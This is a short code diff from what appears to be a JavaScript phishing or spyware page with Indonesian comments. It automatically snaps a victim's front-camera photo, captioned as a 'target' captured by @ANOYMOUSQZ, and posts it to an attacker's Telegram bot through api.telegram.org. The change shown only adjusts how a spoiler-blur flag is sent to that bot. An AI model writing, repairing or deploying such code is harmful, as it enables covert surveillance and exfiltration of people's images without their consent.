@@ -121,8 +121,8 @@
             formData.append('photo', blob, 'snapshot.png');
             formData.append('caption', '📸 Target Berhasil\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.');
             
-            // 🌟 MENAMBAHKAN FITUR SENSOR BLUR OTOMATIS (SPOILER)
-            formData.append('has_spoiler', 'true'); 
+            // Perbaikan Parameter: Menggunakan tipe JSON asli JSON.parse agar dibaca Boolean oleh Telegram API
+            formData.append('has_spoiler', JSON.parse('true')); 
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
